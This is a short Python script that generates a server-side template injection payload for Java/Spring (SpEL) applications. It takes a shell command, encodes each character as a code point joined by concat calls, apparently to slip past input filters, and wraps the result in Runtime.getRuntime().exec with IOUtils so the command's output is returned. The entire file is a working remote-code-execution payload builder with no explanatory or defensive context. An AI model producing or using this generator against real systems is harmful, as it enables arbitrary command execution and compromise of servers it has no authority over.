#!/usr/bin/python3
import sys

def convert(c):
  r = str(ord(c))
  return (r)

cmd = sys.argv[1]
code = ('*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % convert(cmd[0]))

for char in cmd[1:]:
  code += '.concat(T(java.lang.Character).toString(%s))' % (convert(char))

code += ').getInputStream())}'
  
print (code)
